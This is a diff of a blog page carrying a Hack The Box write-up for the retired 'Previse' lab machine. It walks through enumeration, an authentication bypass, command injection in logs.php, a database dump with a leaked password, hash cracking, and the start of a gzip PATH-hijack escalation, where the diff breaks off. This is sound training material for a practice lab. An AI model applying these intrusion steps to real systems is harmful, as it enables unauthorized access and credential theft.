@@ -15,7 +15,7 @@
     <meta property="og:url" content="inesmartins.github.io/htb-write-up-previse/" />
     <meta property="og:image" content="inesmartins.github.io/content/images/2022/01/Screenshot-2022-01-05-at-15.03.17.png" />
     <meta property="article:published_time" content="2022-01-21T11:04:08.000Z" />
-    <meta property="article:modified_time" content="2022-01-21T11:16:58.000Z" />
+    <meta property="article:modified_time" content="2022-03-23T18:25:09.000Z" />
     <meta name="twitter:card" content="summary_large_image" />
     <meta name="twitter:title" content="HTB Write-up | Previse" />
     <meta name="twitter:description" content="Retired machine can be found here.ScanningAs always, we start by mapping the previse.htb hostname to the given IP:  ~ sudo nano /etc/hosts 10.10.11.104  previse.htbThe nmap scan is pretty boring, it seems there&#x27;s a web server running on port 80 and an SSH server on" />
@@ -50,7 +50,7 @@
     "headline": "HTB Write-up | Previse",
     "url": "inesmartins.github.io/htb-write-up-previse/",
     "datePublished": "2022-01-21T11:04:08.000Z",
-    "dateModified": "2022-01-21T11:16:58.000Z",
+    "dateModified": "2022-03-23T18:25:09.000Z",
     "image": {
         "@type": "ImageObject",
         "url": "inesmartins.github.io/content/images/2022/01/Screenshot-2022-01-05-at-15.03.17.png",
@@ -658,9 +658,9 @@
             </figure>
             <section class="post-content">
 
-                <blockquote>Retired machine can be found <a href="https://www.hackthebox.com/home/machines/profile/373">here</a>.</blockquote><h2 id="scanning">Scanning</h2><p>As always, we start by mapping the <code>previse.htb</code> hostname to the given IP: </p><pre><code>~ sudo nano /etc/hosts
+                <blockquote>Retired machine can be found <a href="https://www.hackthebox.com/home/machines/profile/373">here</a>.</blockquote><h2 id="scanning">Scanning</h2><p>As always, we start by mapping the <code>previse.htb</code> hostname to the given IP: </p><pre><code class="language-prettyprint lang-sh">~ sudo nano /etc/hosts
 
-10.10.11.104  previse.htb</code></pre><p>The <code>nmap</code> scan is pretty boring, it seems there's a web server running on port <code>80</code> and an SSH server on port <code>22</code>:</p><pre><code>~ nmap 10.10.11.104
+10.10.11.104  previse.htb</code></pre><p>The <code>nmap</code> scan is pretty boring, it seems there's a web server running on port <code>80</code> and an SSH server on port <code>22</code>:</p><pre><code class="language-prettyprint lang-sh">~ nmap 10.10.11.104
 
 PORT   STATE SERVICE
 22/tcp open  ssh
@@ -682,7 +682,7 @@ PORT   STATE SERVICE VERSION
 | http-title: Previse Login
 |_Requested resource was login.php
 |_http-server-header: Apache/2.4.29 (Ubuntu)
-Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</code></pre><h2 id="enumeration">Enumeration</h2><p>When we access <a href="http://previse.htb">previse.htb</a> we're redirected to the login page:</p><figure class="kg-card kg-image-card kg-width-wide"></figure><p>Let's try to enumerate some directories and files with <code>gobuster</code>:</p><pre><code>~ gobuster dir \
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</code></pre><h2 id="enumeration">Enumeration</h2><p>When we access <a href="http://previse.htb">previse.htb</a> we're redirected to the login page:</p><figure class="kg-card kg-image-card kg-width-wide"></figure><p>Let's try to enumerate some directories and files with <code>gobuster</code>:</p><pre><code class="language-prettyprint lang-sh">~ gobuster dir \
 -u http://previse.htb \
 -c PHPSESSID=r989gcoqshohp5v8thvcji2sh2 \
 -x php \
@@ -705,7 +705,7 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</code></pre><h2 id="enum
 /logout.php           (Status: 302) [Size: 0] [--&gt; login.php]                
 /logs.php             (Status: 302) [Size: 0] [--&gt; login.php]
 /nav.php              (Status: 200) [Size: 1248]
-/status.php           (Status: 302) [Size: 2970] [--&gt; login.php] </code></pre><p>All of the pages either redirect to <code>login.php</code> or have no interesting content, except for the <code>nav.php</code> which has some interesting links:</p><figure class="kg-card kg-image-card"></figure><p>The links are:</p><ul><li>Home: <code>/index.php</code></li><li>Accounts + Create Account: <code>/accounts.php</code></li><li>Files: <code>/files.php</code></li><li>Management Menu + Website Status: <code>/status.php</code></li><li>Log data: <code>/file_logs.php</code></li></ul><p>... but they all redirect to <code>login.php</code> since we're not authenticated.</p><h2 id="bypassing-authentication">Bypassing Authentication</h2><p>The <code>accounts.php</code> page seems the most interesting, maybe we can try some other HTTP methods:</p><figure class="kg-card kg-image-card kg-width-wide"></figure><p>Using this <code>POST</code> request we can create a new user and then use these creds to log in:</p><figure class="kg-card kg-image-card kg-width-wide"></figure><h2 id="exploring-the-website">Exploring the website</h2><p>On the <code>files.php</code> page there are clearly some attempts to upload reverse shells, as well as a <code>zip</code> file that contains the site backup:</p><figure class="kg-card kg-image-card kg-width-wide"></figure><p>In the backup we can see that the <code>config.php</code> file contains the DB credentials:</p><figure class="kg-card kg-image-card"></figure><p>But the <code>logs.php</code> has the most potential, since there's a call to an <code>exec</code> function that uses a parameter sent via <code>POST</code> request:</p><figure class="kg-card kg-image-card kg-width-wide"></figure><p>We already know the format of this <code>POST</code> request since it's the one performed on the <code>file_logs.php</code> page:</p><pre><code>POST /logs.php HTTP/1.1
+/status.php           (Status: 302) [Size: 2970] [--&gt; login.php] </code></pre><p>All of the pages either redirect to <code>login.php</code> or have no interesting content, except for the <code>nav.php</code> which has some interesting links:</p><figure class="kg-card kg-image-card"></figure><p>The links are:</p><ul><li>Home: <code>/index.php</code></li><li>Accounts + Create Account: <code>/accounts.php</code></li><li>Files: <code>/files.php</code></li><li>Management Menu + Website Status: <code>/status.php</code></li><li>Log data: <code>/file_logs.php</code></li></ul><p>... but they all redirect to <code>login.php</code> since we're not authenticated.</p><h2 id="bypassing-authentication">Bypassing Authentication</h2><p>The <code>accounts.php</code> page seems the most interesting, maybe we can try some other HTTP methods:</p><figure class="kg-card kg-image-card kg-width-wide"></figure><p>Using this <code>POST</code> request we can create a new user and then use these creds to log in:</p><figure class="kg-card kg-image-card kg-width-wide"></figure><h2 id="exploring-the-website">Exploring the website</h2><p>On the <code>files.php</code> page there are clearly some attempts to upload reverse shells, as well as a <code>zip</code> file that contains the site backup:</p><figure class="kg-card kg-image-card kg-width-wide"></figure><p>In the backup we can see that the <code>config.php</code> file contains the DB credentials:</p><figure class="kg-card kg-image-card"></figure><p>But the <code>logs.php</code> has the most potential, since there's a call to an <code>exec</code> function that uses a parameter sent via <code>POST</code> request:</p><figure class="kg-card kg-image-card kg-width-wide"></figure><p>We already know the format of this <code>POST</code> request since it's the one performed on the <code>file_logs.php</code> page:</p><pre><code class="language-prettyprint lang-sh">POST /logs.php HTTP/1.1
 Host: previse.htb
 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:95.0) Gecko/20100101 Firefox/95.0
 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
@@ -719,7 +719,7 @@ Referer: http://previse.htb/file_logs.php
 Cookie: PHPSESSID=prod44vfotfs0nvgir215458f0
 Upgrade-Insecure-Requests: 1
 
-delim=tab</code></pre><p>When we change this <code>delim</code> parameter to send a <code>curl</code> request to a simple local web server we get a ping back!</p><figure class="kg-card kg-image-card kg-width-wide"></figure><p>So, let's go for the reverse shell:</p><figure class="kg-card kg-image-card kg-width-wide"></figure><p>We're in!</p><hr></hr><h2 id="becoming-m4lwhere">Becoming m4lwhere</h2><p>First order of business: upgrade the shell!</p><pre><code class="language-python">~ python -c 'import pty; pty.spawn("/bin/bash")'</code></pre><p>Let's see what else is there:</p><pre><code>bash-4.4$ cat /etc/passwd
+delim=tab</code></pre><p>When we change this <code>delim</code> parameter to send a <code>curl</code> request to a simple local web server we get a ping back!</p><figure class="kg-card kg-image-card kg-width-wide"></figure><p>So, let's go for the reverse shell:</p><figure class="kg-card kg-image-card kg-width-wide"></figure><p>We're in!</p><hr></hr><h2 id="becoming-m4lwhere">Becoming m4lwhere</h2><p>First order of business: upgrade the shell!</p><pre><code class="language-prettyprint lang-python">~ python -c 'import pty; pty.spawn("/bin/bash")'</code></pre><p>Let's see what else is there:</p><pre><code class="language-prettyprint lang-bsh">bash-4.4$ cat /etc/passwd
 
 root:x:0:0:root:/root:/bin/bash
 daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
@@ -751,16 +751,15 @@ landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
 pollinate:x:109:1::/var/cache/pollinate:/bin/false
 sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
 m4lwhere:x:1000:1000:m4lwhere:/home/m4lwhere:/bin/bash
-mysql:x:111:114:MySQL Server,,,:/nonexistent:/bin/false</code></pre><p>We have access to <code>m4lwhere</code>'s home directory, but not to the user flag:</p><pre><code>bash-4.4$ cd /home/m4lwhere
+mysql:x:111:114:MySQL Server,,,:/nonexistent:/bin/false</code></pre><p>We have access to <code>m4lwhere</code>'s home directory, but not to the user flag:</p><pre><code class="language-prettyprint lang-bsh">bash-4.4$ cd /home/m4lwhere
 
 bash-4.4$ ls
 user.txt
 
 bash-4.4$ cat user.txt
-cat: user.txt: Permission denied</code></pre><p>Let's dump the database, since we already have the creds:</p><pre><code>~ mysqldump -u root -p --all-databases &gt; db_dump.sql
+cat: user.txt: Permission denied</code></pre><p>Let's dump the database, since we already have the creds:</p><pre><code class="language-prettyprint lang-bsh">bash-4.4$ mysqldump -u root -p --all-databases &gt; db_dump.sql
 
-Enter password: mySQL_p@ssw0rd!:)
-</code></pre><p>There's a hashed password for the <code>m4lwhere</code> user on the <code>accounts</code> table:</p><pre><code class="language-sql">CREATE TABLE `accounts` (
+Enter password: mySQL_p@ssw0rd!:)</code></pre><p>There's a hashed password for the <code>m4lwhere</code> user on the <code>accounts</code> table:</p><pre><code class="language-prettyprint lang-sql">CREATE TABLE `accounts` (
   `id` int(11) NOT NULL AUTO_INCREMENT,
   `username` varchar(50) NOT NULL,
   `password` varchar(255) NOT NULL,
@@ -771,12 +770,12 @@ Enter password: mySQL_p@ssw0rd!:)
 
 INSERT INTO `accounts` VALUES 
 (1,'m4lwhere','$1$ðŸ§‚llol$DQpmdvnb7EeuO6UaqRItf.','2021-05-27 18:18:36'),
-[...]</code></pre><p>Save me <code>hashcat</code>!</p><pre><code>~ nano hash
+[...]</code></pre><p>Save me <code>hashcat</code>!</p><pre><code class="language-prettyprint lang-sh">~ nano hash
 
 $1$🧂llol$DQpmdvnb7EeuO6UaqRItf.
 
 ~ hashcat -a 0 -m 500 hash ../seclists/pwds/rockyou.txt --show
-$1$🧂llol$DQpmdvnb7EeuO6UaqRItf.:ilovecody112235!</code></pre><p>We got the password!</p><pre><code>~ ssh m4lwhere@previse.htb
+$1$🧂llol$DQpmdvnb7EeuO6UaqRItf.:ilovecody112235!</code></pre><p>We got the password!</p><pre><code class="language-prettyprint lang-sh">~ ssh m4lwhere@previse.htb
 
 m4lwhere@previse.htb's password: 
 &gt; ilovecody112235!
@@ -784,14 +783,14 @@ m4lwhere@previse.htb's password:
 [...]
 
 bash-4.4$ cat user.txt 
-cff266072b891cf5458d490516040d5b</code></pre><hr></hr><h2 id="road-to-root">Road to root</h2><p>After some poking around I went back to the <code>/opt/script</code> directory:</p><pre><code>bash-4.4$ cd /opt/scripts/
+cff266072b891cf5458d490516040d5b</code></pre><hr></hr><h2 id="road-to-root">Road to root</h2><p>After some poking around I went back to the <code>/opt/script</code> directory:</p><pre><code class="language-prettyprint lang-bsh">bash-4.4$ cd /opt/scripts/
 
 bash-4.4$ ls -la
 total 16
 drwxr-xr-x 2 root     root     4096 Jul 26 18:41 .
 drwxr-xr-x 3 root     root     4096 Jul 26 18:41 ..
 -rwxr-xr-x 1 root     root      486 Jun  6  2021 access_backup.sh
--rw-r--r-- 1 m4lwhere m4lwhere  320 Jun  6  2021 log_process.py</code></pre><p>The <code>access_backup.sh</code> file looks very interesting:</p><pre><code>bash-4.4$ cat access_backup.sh
+-rw-r--r-- 1 m4lwhere m4lwhere  320 Jun  6  2021 log_process.py</code></pre><p>The <code>access_backup.sh</code> file looks very interesting:</p><pre><code class="language-prettyprint lang-bsh">bash-4.4$ cat access_backup.sh
 #!/bin/bash
 
 # We always make sure to store logs, we take security SERIOUSLY here
@@ -800,7 +799,7 @@ drwxr-xr-x 3 root     root     4096 Jul 26 18:41 ..
 # This is configured to run with cron, added to sudo so I can run as needed - we'll fix it later when there's time
 
 gzip -c /var/log/apache2/access.log &gt; /var/backups/$(date --date="yesterday" +%Y%b%d)_access.gz
-gzip -c /var/www/file_access.log &gt; /var/backups/$(date --date="yesterday" +%Y%b%d)_file_access.gz</code></pre><p>OK, what if we poison the <code>gzip</code> binary:</p><pre><code>bash-4.4$ which gzip
+gzip -c /var/www/file_access.log &gt; /var/backups/$(date --date="yesterday" +%Y%b%d)_file_access.gz</code></pre><p>OK, what if we poison the <code>gzip</code> binary:</p><pre><code class="language-prettyprint lang-bsh">bash-4.4$ which gzip
 /bin/gzip
 
 bash-4.4$ echo $PATH
